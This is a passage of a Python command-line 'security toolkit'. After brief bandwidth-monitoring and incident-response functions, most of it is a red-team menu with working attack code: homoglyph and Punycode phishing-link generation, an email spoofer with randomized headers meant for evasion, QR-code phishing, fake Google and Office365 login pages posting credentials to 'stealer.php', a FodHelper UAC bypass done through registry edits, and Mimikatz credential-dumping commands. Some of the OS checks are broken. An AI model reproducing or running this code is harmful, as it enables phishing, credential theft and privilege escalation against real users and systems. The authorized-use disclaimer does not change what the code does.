        safe_input("\n🔄 Press Enter to return to the menu...")
        return

    duration = safe_input("⏳ Enter monitoring duration in seconds (default: 30): ").strip()
    duration = int(duration) if duration.isdigit() else 30  # Default: 30 seconds

    threshold = safe_input("⚠️ Set alert threshold (Mbps, default: 10): ").strip()
    threshold = float(threshold) if threshold.replace('.', '', 1).isdigit() else 10.0  # Default: 10 Mbps

    save_log = safe_input("💾 Save bandwidth usage log? (y/n): ").strip().lower()

    print(f"\n📡 Monitoring {interface} for {duration} seconds...")
    print("⏳ Tracking bandwidth usage. Press CTRL+C to stop.\n")

    log_data = [("Time", "Download Mbps", "Upload Mbps")]

    try:
        prev_stats = psutil.net_io_counters(pernic=True).get(interface)
        if not prev_stats:
            print(f"❌ Error: Interface {interface} not found.")
            return

        start_time = time.time()
        while time.time() - start_time < duration:
            time.sleep(1)
            current_stats = psutil.net_io_counters(pernic=True).get(interface)
            if not current_stats:
                print(f"❌ Error: Interface {interface} not available.")
                break

            down_speed = (current_stats.bytes_recv - prev_stats.bytes_recv) * 8 / 1e6  # Mbps
            up_speed = (current_stats.bytes_sent - prev_stats.bytes_sent) * 8 / 1e6  # Mbps
            prev_stats = current_stats

            log_data.append((time.strftime("%H:%M:%S"), round(down_speed, 2), round(up_speed, 2)))

            # Display live results
            print(f"📊 Time: {time.strftime('%H:%M:%S')} | ⬇ Download: {down_speed:.2f} Mbps | ⬆ Upload: {up_speed:.2f} Mbps")

            # Alert on high bandwidth usage
            if down_speed > threshold or up_speed > threshold:
                print(f"🚨 High Bandwidth Usage! Download: {down_speed:.2f} Mbps | Upload: {up_speed:.2f} Mbps")

    except KeyboardInterrupt:
        print("\n🚪 Monitoring stopped by user.")

    # Save log if enabled
    if save_log == "y":
        filename = f"bandwidth_log_{interface}.csv"
        with open(filename, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerows(log_data)
        print(f"✅ Bandwidth usage log saved to: {filename}")

    safe_input("\n✅ Bandwidth monitoring complete...Press enter to continue.")
    
###########################################################################
#                                                                         #
#                       INCIDENT RESPONSE MENU                            #
#                                                                         #
###########################################################################

def incident_response_menu():
    """Incident Response & Forensics Menu"""
    while True:
        clear_screen()
        print("\n🚔 Incident Response & Forensics (Linux Only)")
        print("1  Collect System Logs (journalctl/syslog)")
        print("2  Live Memory Dump & Analysis (volatility)")
        print("3  File Integrity Check (AIDE)")
        print("4  Scan for Malware (YARA / ClamAV)")
        print("5  List Active Network Connections")
        print("6  Extract Recent Command History")
        print("7  Back to Advanced Security Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            collect_system_logs()
        elif choice == "2":
            analyze_memory_dump()
        elif choice == "3":
            check_file_integrity()
        elif choice == "4":
            scan_for_malware()
        elif choice == "5":
            list_active_connections()
        elif choice == "6":
            extract_command_history()
        elif choice == "7":
            return  # Go back
        else:
            print("❌ Invalid choice. Try again.")

def collect_system_logs():
    """Collect and analyze system logs"""
    log_file = f"system_logs_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
    print("\n📜 Collecting system logs...\n")

    command = ["journalctl", "--no-pager", "--since", "24h"]
    execute_command(command, log_file)

def analyze_memory_dump():
    """Dump live memory and analyze with Volatility"""
    memory_dump = "memory_dump.raw"
    print("\n🧠 Dumping system memory...\n")

    subprocess.run(["sudo", "dd", "if=/dev/mem", f"of={memory_dump}", "bs=1M", "count=1024"])
    
    print("\n🔎 Analyzing memory dump with Volatility...")
    subprocess.run(["volatility", "-f", memory_dump, "--profile=Linux", "pslist"])

def check_file_integrity():
    """Check file integrity with AIDE"""
    print("\n🛡 Checking file integrity...\n")
    
    command = ["aide", "--check"]
    execute_command(command, "aide_integrity_report.txt")

def scan_for_malware():
    """Run malware scan using YARA and ClamAV"""
    scan_path = safe_input("Enter path to scan for malware: ").strip()
    
    print("\n🔬 Scanning with ClamAV...")
    execute_command(["clamscan", "-r", scan_path], "clamav_scan_results.txt")
    
    print("\n🕵️ Scanning with YARA rules...")
    execute_command(["yara", "-r", "malware_rules.yara", scan_path], "yara_scan_results.txt")

def list_active_connections():
    """List active network connections"""
    print("\n🌐 Listing active network connections...\n")
    
    command = ["netstat", "-tulnp"]
    execute_command(command, "active_connections.txt")

def extract_command_history():
    """Extract recent shell command history"""
    print("\n📜 Extracting recent command history...\n")
    
    command = ["cat", "~/.bash_history"]
    execute_command(command, "command_history.txt")

###########################################################################
#                                                                         #
#                             RED TEAM MENU                               #
#                                                                         #
###########################################################################

def red_team_menu():
    """Red Team Tools Menu"""
    while True:
        clear_screen()

        disclaimer = r"""     

         ▓█████▄  ██▓  ██████  ▄████▄   ██▓    ▄▄▄       ██▓ ███▄ ▄███▓▓█████  ██▀███  
        ▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓██▒   ▒████▄    ▓██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
        ░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░   ▒██  ▀█▄  ▒██▒▓██    ▓██░▒███   ▓██ ░▄█ ▒
        ░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██░   ░██▄▄▄▄██ ░██░▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
        ░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░██████▒▓█   ▓██▒░██░▒██▒   ░██▒░▒████▒░██▓ ▒██▒
        ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▓  ░▒▒   ▓▒█░░▓  ░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒   ░ ░ ▒  ░ ▒   ▒▒ ░ ▒ ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
        ░ ░  ░  ▒ ░░  ░  ░  ░          ░ ░    ░   ▒    ▒ ░░      ░      ░     ░░   ░ 
        ░     ░        ░  ░ ░          ░  ░     ░  ░ ░         ░      ░  ░   ░     
        ░                   ░                                                        
        🚨 WARNING: AUTHORIZED USE ONLY 🚨
    
        This toolkit is intended for ethical hacking, penetration testing, and security research.
        Unauthorized use of these tools against systems you do not own or have explicit permission 
        to test is ILLEGAL and may result in severe consequences.

        By using this menu, you acknowledge that:
        ✅ You have **explicit permission** to perform security testing.
        ✅ You accept full responsibility for any actions taken.
        ✅ You will adhere to **all applicable laws and ethical guidelines**.

        ⚠️  If you do not have permission, **EXIT IMMEDIATELY**.  ⚠️
        """
        print(disclaimer)
        print("1  Exploitation Frameworks")
        print("2  Phishing & Social Engineering")
        print("3  Privilege Escalation & Post-Exploitation")
        print("4  Evasion & Anti-Forensics")
        print("5  Back to Main Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            exploitation_frameworks()
        elif choice == "2":
            phishing_social_engineering()
        elif choice == "3":
            privilege_escalation_tools()
        elif choice == "4":
            evasion_anti_forensics()
        elif choice == "5":
            return  # Go back to the main menu
        else:
            print("❌ Invalid choice. Try again.")

def exploitation_frameworks():
    """List popular exploitation frameworks with installation and usage guidance."""
    clear_screen()
    print("\n🛠️  Exploitation Frameworks & Installation Guides")

    frameworks = {
        "1": {
            "name": "Metasploit Framework",
            "install": "https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html",
            "usage": "msfconsole"
        },
        "2": {
            "name": "Exploit-DB (SearchSploit)",
            "install": "https://github.com/offensive-security/exploitdb",
            "usage": "searchsploit <exploit-name>"
        },
        "3": {
            "name": "BeEF (Browser Exploitation Framework)",
            "install": "https://github.com/beefproject/beef",
            "usage": "beef-xss"
        },
        "4": {
            "name": "Empire (PowerShell & Python Post-Exploitation)",
            "install": "https://github.com/BC-SECURITY/Empire",
            "usage": "./empire"
        },
        "5": {
            "name": "SET (Social-Engineer Toolkit)",
            "install": "https://github.com/trustedsec/social-engineer-toolkit",
            "usage": "setoolkit"
        }
    }

    for key, fw in frameworks.items():
        print(f"{key}. {fw['name']}")

    choice = safe_input("\n🛠 Select a framework for installation and usage instructions (or press Enter to return): ").strip()

    if choice in frameworks:
        fw = frameworks[choice]
        print(f"\n📌 Framework: {fw['name']}")
        print(f"🔗 Installation Guide: {fw['install']}")
        print(f"⚙️  Basic Usage Command: {fw['usage']}")

    safe_input("\n🔄 Press Enter to return to the previous menu...")

def phishing_social_engineering():
    """Phishing & Social Engineering Menu"""
    clear_screen()

    print("\n🎭 PHISHING & SOCIAL ENGINEERING TOOLS 🎭\n")
    print("1  Basic URL Obfuscation")
    print("2  Advanced Phishing Link Generator (Homoglyphs, Punycode, Shortened URLs)")
    print("3  Email Spoofing Toolkit")
    print("4  QR Code Phishing Generator")
    print("5  Fake Login Page Generator")
    print("6  Back to Red Team Menu")

    choice = safe_input("\nSelect an option: ").strip()

    if choice == "1":
        basic_url_obfuscation()
    elif choice == "2":
        advanced_phishing_links()
    elif choice == "3":
        email_spoofing_toolkit()
    elif choice == "4":
        qr_code_phishing()
    elif choice == "5":
        fake_login_generator()
    elif choice == "6":
        return  # Back to Red Team Menu
    else:
        print("❌ Invalid choice. Try again.")
        time.sleep(1)
        phishing_social_engineering()  # Reload menu on invalid input

def basic_url_obfuscation():
    """Generate basic obfuscated phishing links."""
    clear_screen()
    print("\n🔗 BASIC URL OBFUSCATION TOOL 🔗")

    url = safe_input("\nEnter the target URL: ").strip()

    # Hex Encoding
    hex_encoded = "".join(f"%{hex(ord(c))[2:]}" for c in url)

    # Base64 Encoding
    base64_encoded = base64.urlsafe_b64encode(url.encode()).decode()

    # Reversed Domain
    parsed_url = urllib.parse.urlparse(url)
    reversed_domain = ".".join(parsed_url.netloc.split(".")[::-1])
    reversed_url = f"{parsed_url.scheme}://{reversed_domain}{parsed_url.path}"

    # Convert Domain to IP (if possible)
    try:
        ip_version = "IPv4"
        ip_address = socket.gethostbyname(parsed_url.netloc)
    except socket.gaierror:
        ip_address = "Resolution Failed"
        ip_version = "N/A"

    obfuscated_urls = {
        "Hex Encoded": hex_encoded,
        "Base64 Encoded": base64_encoded,
        "Reversed Domain": reversed_url,
        "IP Address Version": ip_version,
        "Domain as IP": f"{parsed_url.scheme}://{ip_address}{parsed_url.path}" if ip_address != "Resolution Failed" else "N/A"
    }

    print("\n🎭 Obfuscated URLs:")
    for method, obf_url in obfuscated_urls.items():
        print(f"🔹 {method}: {obf_url}")

    save_log = safe_input("\n💾 Save these results to a file? (y/n): ").strip().lower()
    if save_log == "y":
        filename = f"url_obfuscation_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            for method, obf_url in obfuscated_urls.items():
                f.write(f"{method}: {obf_url}\n")
        print(f"✅ Results saved to: {filename}")

    safe_input("\n✅ Press Enter to return to the menu...")

HOMOGLYPHS = {
    "a": ["а", "𝗮", "𝐚", "𝒂", "𝕒"],
    "e": ["е", "𝘦", "𝙚", "𝑒", "𝒆"],
    "i": ["і", "𝗂", "𝒊", "𝕚", "𝐢"],
    "o": ["о", "𝗼", "𝑜", "𝙤", "𝑜"],
    "l": ["𝗅", "𝙡", "𝑙", "𝓁", "𝓵"],
    "t": ["𝗍", "𝘵", "𝑡", "𝙩", "𝓉"]
}

def random_homoglyph(text):
    """Replaces random characters with homoglyphs for phishing."""
    return "".join(random.choice(HOMOGLYPHS.get(char, [char])) for char in text)

def to_punycode(domain):
    """Converts a domain into Punycode format (for IDN phishing)."""
    try:
        return domain.encode("idna").decode()
    except Exception:
        return "❌ Punycode conversion failed"

def generate_shortened_url(url):
    """Uses TinyURL API to shorten the URL."""
    try:
        response = requests.get(f"http://tinyurl.com/api-create.php?url={url}")
        return response.text if response.status_code == 200 else "❌ URL shortening failed"
    except Exception:
        return "❌ URL shortening failed"

def advanced_phishing_links():
    """Generate deceptive phishing links using homoglyphs, Punycode, and shortening."""
    clear_screen()
    print("\n🎭 ADVANCED PHISHING LINK GENERATOR 🎭")

    url = safe_input("\nEnter the target URL (e.g., https://paypal.com): ").strip()

    parsed_url = urllib.parse.urlparse(url)
    domain = parsed_url.netloc
    path = parsed_url.path if parsed_url.path else ""

    # Homoglyph Substitution
    homoglyph_domain = random_homoglyph(domain)
    homoglyph_url = f"{parsed_url.scheme}://{homoglyph_domain}{path}"

    # Punycode Encoding
    punycode_domain = to_punycode(domain)
    punycode_url = f"{parsed_url.scheme}://{punycode_domain}{path}"

    # Shortened URL
    shortened_url = generate_shortened_url(url)

    # Masked Link Example (Deceptive display text)
    masked_link = f"[Click Here](http://{homoglyph_domain})"

    print("\n🔗 Generated Phishing Links:")
    print(f"🎭 Homoglyph Attack: {homoglyph_url}")
    print(f"🌐 Punycode Spoof: {punycode_url}")
    print(f"🔗 Shortened URL: {shortened_url}")
    print(f"🎭 Masked Link: {masked_link}")

    save_log = safe_input("\n💾 Save these results to a file? (y/n): ").strip().lower()
    if save_log == "y":
        filename = f"phishing_links_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"Homoglyph Attack: {homoglyph_url}\n")
            f.write(f"Punycode Spoof: {punycode_url}\n")
            f.write(f"Shortened URL: {shortened_url}\n")
            f.write(f"Masked Link: {masked_link}\n")
        print(f"✅ Results saved to: {filename}")

    safe_input("\n✅ Press Enter to return to the menu...")

def email_spoofing_toolkit():
    """Menu for various email spoofing & phishing tools."""
    while True:
        clear_screen()
        print("\n✉️  Email Spoofing & Phishing Toolkit")
        print("1  Send Spoofed Email")
        print("2  Analyze Email Headers")
        print("3  Generate Typosquatted Emails")
        print("4  Check for Disposable Emails")
        print("5  Scan for SMTP Open Relays")
        print("6  Back to Phishing & Social Engineering Menu")

        choice = safe_input("\nSelect an option: ").strip()

        if choice == "1":
            email_spoofing()
        elif choice == "2":
            analyze_email_headers()
        elif choice == "3":
            generate_typosquatted_emails()
        elif choice == "4":
            check_disposable_email()
        elif choice == "5":
            smtp_open_relay_scan()
        elif choice == "6":
            return  # Go back to the main phishing & social engineering menu
        else:
            print("❌ Invalid choice. Try again.")

# Randomized email headers for evasion
EMAIL_HEADERS = {
    "X-Mailer": ["Microsoft Outlook 16.0", "Thunderbird", "Apple Mail", "Gmail Web"],
    "User-Agent": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (Linux; Android 10; Mobile)",
    ]
}

def email_spoofing():
    """Send a spoofed email using a chosen SMTP relay with enhanced evasion."""
    print("\n✉️  Email Spoofing Tool")

    sender_name = safe_input("🕵️  Enter the fake sender name: ").strip()
    sender_email = safe_input("📧 Enter the fake sender email: ").strip()
    recipient_email = safe_input("🎯 Enter recipient emails (comma-separated): ").strip()
    subject = safe_input("📌 Enter the subject: ").strip()
    message_body = safe_input("💬 Enter the email body: ").strip()

    # HTML Email Support
    is_html = safe_input("🖋️  Send as HTML email? (y/n): ").strip().lower()
    if is_html == "y":
        message_body = f"<html><body><p>{message_body}</p></body></html>"

    # Allow attachment (optional)
    attachment_path = safe_input("📎 Attach a file? Enter path or press Enter to skip: ").strip()

    # SMTP Configuration (User must provide valid relay credentials)
    smtp_server = safe_input("📡 Enter SMTP relay server (e.g., smtp-relay.sendinblue.com): ").strip()
    smtp_port = safe_input("🔌 Enter SMTP port (default: 587): ").strip()
    smtp_port = int(smtp_port) if smtp_port.isdigit() else 587

    smtp_username = safe_input("🔑 Enter SMTP username: ").strip()
    smtp_password = safe_input("🔐 Enter SMTP password: ").strip()

    # Construct email
    msg = EmailMessage()
    msg["From"] = f"{sender_name} <{sender_email}>"
    msg["To"] = recipient_email
    msg["Subject"] = subject

    if is_html == "y":
        msg.add_alternative(message_body, subtype="html")
    else:
        msg.set_content(message_body)

    # Attach file if provided
    if attachment_path:
        try:
            with open(attachment_path, "rb") as file:
                file_data = file.read()
                file_name = attachment_path.split("/")[-1]
                msg.add_attachment(file_data, maintype="application", subtype="octet-stream", filename=file_name)
            print(f"✅ Attached file: {file_name}")
        except FileNotFoundError:
            print("❌ Attachment not found, skipping...")

    # Add randomized headers for stealth
    msg["X-Mailer"] = random.choice(EMAIL_HEADERS["X-Mailer"])
    msg["User-Agent"] = random.choice(EMAIL_HEADERS["User-Agent"])

    # Send email
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls(context=context)
            server.login(smtp_username, smtp_password)
            server.send_message(msg)
        print("\n✅ Spoofed email sent successfully!")
        
        # Logging option
        log_choice = safe_input("📜 Save email details to log file? (y/n): ").strip().lower()
        if log_choice == "y":
            log_filename = f"email_spoof_log_{int(time.time())}.txt"
            with open(log_filename, "w", encoding="utf-8") as log_file:
                log_file.write(f"From: {sender_email} ({sender_name})\n")
                log_file.write(f"To: {recipient_email}\n")
                log_file.write(f"Subject: {subject}\n")
                log_file.write(f"Body:\n{message_body}\n")
            print(f"✅ Log saved to: {log_filename}")

    except smtplib.SMTPAuthenticationError:
        print("❌ Authentication failed. Check your SMTP credentials.")
    except Exception as e:
        print(f"❌ Error sending email: {e}")

    safe_input("\n🔍 Press Enter to return to the menu...")
           
def analyze_email_headers():
    """Analyze email headers for spoofing indicators."""
    print("\n📑 Email Header Analyzer")
    
    header_file = safe_input("📂 Enter path to email headers file (or paste headers directly): ").strip()
    
    if os.path.exists(header_file):
        with open(header_file, "r", encoding="utf-8") as f:
            headers = f.read()
    else:
        headers = header_file  # Assume direct input

    print("\n🔍 Analyzing headers...\n")

    spf_match = re.search(r"spf=(\S+)", headers, re.IGNORECASE)
    dkim_match = re.search(r"dkim=(\S+)", headers, re.IGNORECASE)
    ip_match = re.search(r"Received: from .*? \[(\d+\.\d+\.\d+\.\d+)\]", headers, re.IGNORECASE)

    print(f"📌 SPF Record: {spf_match.group(1) if spf_match else 'Not found'}")
    print(f"📌 DKIM Status: {dkim_match.group(1) if dkim_match else 'Not found'}")
    print(f"📌 Sending IP: {ip_match.group(1) if ip_match else 'Not found'}")

    safe_input("\n🔍 Press Enter to return to the menu...")    

def generate_typosquatted_emails():
    """Generate deceptive email addresses for phishing simulations."""
    print("\n🎭 Typosquatted Email Generator")
    
    target_domain = safe_input("🏢 Enter target domain (e.g., company.com): ").strip()
    base_username = safe_input("📧 Enter username (e.g., support): ").strip()

    variations = [
        target_domain.replace(".", "-"),
        target_domain.replace(".", ""),
        target_domain.replace("o", "0").replace("l", "1"),
        target_domain[:-1] + target_domain[-1] * 2,
    ]

    print("\n🔹 Possible Typosquatted Emails:")
    for variation in variations:
        print(f"📩 {base_username}@{variation}")

    safe_input("\n🔍 Press Enter to return to the menu...")

DISPOSABLE_EMAIL_PROVIDERS = {
    "tempmail.com", "mailinator.com", "10minutemail.com", "guerrillamail.com", 
    "yopmail.com", "trashmail.com", "maildrop.cc"
}

def check_disposable_email():
    """Check if an email is from a disposable email provider."""
    print("\n🚫 Disposable Email Checker")
    
    email = safe_input("📧 Enter email to check: ").strip()
    domain = email.split("@")[-1].lower()

    if domain in DISPOSABLE_EMAIL_PROVIDERS:
        print(f"🚨 Warning: {email} is a disposable email!")
    else:
        print(f"✅ {email} appears to be a valid email.")

    safe_input("\n🔍 Press Enter to return to the menu...")

def smtp_open_relay_scan():
    """Scan for open SMTP relays."""
    print("\n📡 SMTP Open Relay Scanner")

    smtp_server = safe_input("📡 Enter SMTP server to scan (e.g., mail.example.com): ").strip()
    smtp_port = safe_input("🔌 Enter SMTP port (default: 25): ").strip()
    smtp_port = int(smtp_port) if smtp_port.isdigit() else 25

    try:
        with socket.create_connection((smtp_server, smtp_port), timeout=5) as sock:
            sock.sendall(b"HELO example.com\r\n")
            response = sock.recv(1024).decode()

            if "250" in response:
                print(f"🚨 Potential Open Relay Detected on {smtp_server}:{smtp_port}")
            else:
                print(f"✅ {smtp_server} does not appear to be an open relay.")

    except Exception as e:
        print(f"❌ Error scanning: {e}")

    safe_input("\n🔍 Press Enter to return to the menu...")

def qr_code_phishing():
    """Generate a QR code for phishing campaigns."""
    print("\n📸 QR Code Phishing Tool")

    phishing_url = safe_input("🔗 Enter the phishing URL: ").strip()

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(phishing_url)
    qr.make(fit=True)

    qr_img = qr.make_image(fill="black", back_color="white")
    qr_filename = "phishing_qr.png"
    qr_img.save(qr_filename)

    print(f"✅ QR Code generated: {qr_filename}")
    print("📸 Use this QR code to direct victims to the phishing page.")

    safe_input("\n🔍 Press Enter to return to the menu...")

FAKE_LOGIN_TEMPLATES = {
    "1": ("Google Login", "google_fake.html", """
    <html>
        <head><title>Google Sign-In</title></head>
        <body>
            <h2>Sign in to your Google Account</h2>
            <form action="stealer.php" method="POST">
                <input type="text" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign in</button>
            </form>
        </body>
    </html>
    """),
    "2": ("Office365 Login", "office365_fake.html", """
    <html>
        <head><title>Microsoft Sign-In</title></head>
        <body>
            <h2>Sign in to your Microsoft Account</h2>
            <form action="stealer.php" method="POST">
                <input type="text" name="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Sign in</button>
            </form>
        </body>
    </html>
    """),
    "3": ("Custom Login", "custom_fake.html", "")
}

def fake_login_generator():
    """Generate fake login pages for phishing."""
    print("\n🎭 Fake Login Page Generator")

    print("1. Google Login")
    print("2. Office365 Login")
    print("3. Custom Login Page")

    choice = safe_input("\n🎨 Choose a template (1/2/3): ").strip()

    if choice in FAKE_LOGIN_TEMPLATES:
        template_name, filename, template_content = FAKE_LOGIN_TEMPLATES[choice]

        if choice == "3":
            site_name = safe_input("🏢 Enter the site name (e.g., 'Bank of America'): ").strip()
            template_content = f"""
            <html>
                <head><title>{site_name} Login</title></head>
                <body>
                    <h2>Sign in to {site_name}</h2>
                    <form action="stealer.php" method="POST">
                        <input type="text" name="email" placeholder="Email" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Sign in</button>
                    </form>
                </body>
            </html>
            """
            filename = f"{site_name.lower().replace(' ', '_')}_fake.html"

        with open(filename, "w", encoding="utf-8") as f:
            f.write(template_content)
        
        print(f"✅ Fake login page created: {filename}")
        print("⚠️ Warning: This should only be used for ethical phishing simulations.")

    else:
        print("❌ Invalid choice.")

    safe_input("\n🔍 Press Enter to return to the menu...")

def privilege_escalation_tools():
    """Privilege Escalation Menu."""
    while True:
        print("\n🔹 Privilege Escalation")
        print("1. Windows Privilege Escalation")
        print("2. Linux Privilege Escalation")
        print("3. Back to the main menu")
       
        choice = input("\n🛠 Select an option: ").strip()
        
        if choice == "1":
            if platform.system().lower != "nt":
                print("This section is Windows-only. Please switch your environment.")
                time.sleep(3)
            else:
                windows_priv_esc_menu()
        elif choice == "2":
            if platform.system().lower != "linux":
                print("This section is Linux-only. Please switch your environment.")
                time.sleep(3)
            else:
                linux_priv_esc_menu()
        elif choice == "3":
            break
        else:
            print("❌ Invalid selection.")

def windows_priv_esc_menu():
    """Windows Privilege Escalation Menu."""
    while True:
        print("\n🔹 Windows Privilege Escalation")
        print("1. Enumerate Privileges & Misconfigurations")
        print("2. Exploit Weak Service Permissions")
        print("3. DLL Hijacking")
        print("4. Token Impersonation & UAC Bypass")
        print("5. Automated Tools (WinPEAS, PowerUp, Sherlock)")
        print("6. Mimikatz")
        print("7. Escalate Privileges to SYSTEM")  
        print("8. Automatic Privilege Escalation Checks") 
        print("9. Back to Main Menu")
        
        choice = input("\n🛠 Select an option: ").strip()
        
        if choice == "1":
            enumerate_privileges()
        elif choice == "2":
            web_security_menu()
        elif choice == "3":
            dll_hijacking()
        elif choice == "4":
            token_impersonation_uac_bypass()
        elif choice == "5":
            automated_tools()
        elif choice == "6":
            mimikatz_info()
        elif choice == "7":
            escalate_to_system()  # Newly added
        elif choice == "8":
            auto_priv_esc_checks()  # Newly added
        elif choice == "9":
            return  # Back to main menu
        else:
            print("❌ Invalid selection.")

def log_finding(finding):
    """Logs privilege escalation findings to a report file."""
    with open("windows_priv_escalation_report.txt", "a", encoding="utf-8") as f:
        f.write(finding + "\n")

def run_command(command):
    """Runs a shell command and returns output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return f"Error running command: {e}"

def enumerate_privileges():
    """Checks user privileges and logs results."""
    print("\n🔍 Enumerating Privileges & Misconfigurations...")
    commands = {
        "Current User": "whoami",
        "User Privileges": "whoami /priv",
        "User Groups": "whoami /groups",
        "Local Users": "net user",
        "OS Information": "systeminfo",
        "Installed Patches": "wmic qfe get HotFixID"
    }
    
    findings = "\n📌 Windows Privilege Escalation Report\n"
    for desc, cmd in commands.items():
        output = run_command(cmd)
        findings += f"\n🔹 {desc}:\n{output}\n"
    
    log_finding(findings)
    safe_input("✅ Enumeration complete! Findings saved to windows_priv_escalation_report.txt")

def weak_service_permissions():
    """Explains and checks weak service permissions."""
    print("\n⚙️ Checking for Weak Service Permissions...")
    service_name = safe_input("Enter the service name to check: ").strip()
    
    if not service_name:
        print("❌ No service name provided.")
        return
    
    command = f"sc qc {service_name}"
    output = run_command(command)
    log_finding(f"\n🔍 Service Permissions for {service_name}:\n{output}")
    safe_input("✅ Service check complete! Findings saved.")

def dll_hijacking():
    """Checks for DLL hijacking opportunities."""
    print("\n💻 Checking for DLL Hijacking Opportunities...")
    output = run_command("wmic process get executablepath | findstr /i dll")
    log_finding(f"\n🔍 DLL Hijacking Opportunities:\n{output}")
    safe_input("✅ DLL check complete! Findings saved.")

def automated_tools():
    """Provides installation instructions for privilege escalation tools."""
    print("\n🛠 Installing Privilege Escalation Tools...")
    print("WinPEAS: https://github.com/carlospolop/PEASS-ng/releases\n")
    print("PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\n")
    print("Sherlock: https://github.com/rasta-mouse/Sherlock\n")
    safe_input("Press enter to return to the previous menu...")

def mimikatz_info():
    """Provides installation instructions for Mimikatz."""
    print("\n🔑 Mimikatz Installation Guide")
    print("1. Download from https://github.com/gentilkiwi/mimikatz/releases\n")
    print("2. Run: mimikatz.exe\n")
    print("3. Commands:")
    print("   - privilege::debug")
    print("   - sekurlsa::logonpasswords")
    print("   - sekurlsa::pth")
    safe_input("Press enter to return to the previous menu...")

def token_impersonation_uac_bypass():
    """Token Impersonation & UAC Bypass Techniques."""
    print("\n🔑 Token Impersonation & UAC Bypass")
    print("1. List Available Tokens")
    print("2. Impersonate a Token")
    print("3. Bypass UAC (Requires Admin)")
    print("4. Back to Windows Privilege Escalation Menu")
    
    choice = safe_input("🛠 Select an option: ").strip()
    
    if choice == "1":
        list_tokens()
    elif choice == "2":
        impersonate_token()
    elif choice == "3":
        bypass_uac()
    elif choice == "4":
        return  # Back to previous menu
    else:
        print("❌ Invalid selection. Try again.")
    
def list_tokens():
    """List all available tokens for impersonation."""
    print("\n🔍 Listing Available Tokens...")
    result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True)
    save_to_report("Token_Impersonation", "Available Tokens:\n" + result.stdout)
    print(result.stdout)
    safe_input("\nPress Enter to return...")
    
def check_privileges():
    """Check current privileges for potential escalation."""
    print("\n🔍 Checking Current Privileges...")
    result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True)
    save_to_report("Privilege Check", result.stdout)
    print(result.stdout)
    return result.stdout

def impersonate_token():
    """Attempt to impersonate a high-privilege token if possible."""
    privileges = check_privileges()
    if "SeImpersonatePrivilege" in privileges:
        print("\n🎭 Attempting Token Impersonation...")
        command = "runas /user:Administrator cmd.exe"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        save_to_report("Token Impersonation", "Impersonation Attempt:\n" + result.stdout)
        print(result.stdout)
    else:
        print("❌ Token Impersonation Not Possible (SeImpersonatePrivilege Missing)")
    input("\nPress Enter to return...")

def bypass_uac():
    """Execute a UAC Bypass method with integrity checking and logging."""
    print("\n🔐 Checking current integrity level...")
    integrity_check = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True)

    if "SeImpersonatePrivilege" in integrity_check.stdout:
        print("✅ High integrity level detected. UAC bypass not needed.")
        safe_input("\nPress Enter to return...")
        return

    print("🔹 Attempting UAC Bypass using FodHelper method...")

    try:
        subprocess.run("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd.exe\" /f", shell=True, check=True)
        subprocess.run("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /d \"\" /f", shell=True, check=True)
        subprocess.run("cmd /c start fodhelper.exe", shell=True, check=True)

        print("\n✅ UAC Bypass triggered! A new admin-level command prompt should open shortly.")
        save_to_report("UAC_Bypass", "FodHelper method executed successfully.")

    except subprocess.CalledProcessError as e:
        print(f"❌ UAC Bypass failed: {e}")
        save_to_report("UAC_Bypass", f"Failed: {e}")

    safe_input("\nPress Enter to return to menu...")

def escalate_to_system():
    """Attempt to escalate privileges to SYSTEM if SeDebugPrivilege is available."""
    privileges = check_privileges()
    if "SeDebugPrivilege" in privileges:
        print("\n🚀 SYSTEM Privilege Escalation in Progress...")
        command = "psexec -i -s cmd.exe"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        save_to_report("SYSTEM Escalation", "Escalation Attempt:\n" + result.stdout)
        print(result.stdout)
    else:
        print("❌ SYSTEM Escalation Not Possible (SeDebugPrivilege Missing)")
    input("\nPress Enter to return...")

def auto_priv_esc_checks():
    """Run automated privilege escalation checks."""
    print("\n🔍 Running Automatic Privilege Escalation Checks...")
    check_privileges()
    print("\n✅ Auto Privilege Checks Complete!")
    input("\nPress Enter to return...")

def save_to_report(section, data):
    """Save findings to a report file."""
    with open("privilege_escalation_report.txt", "a") as f:
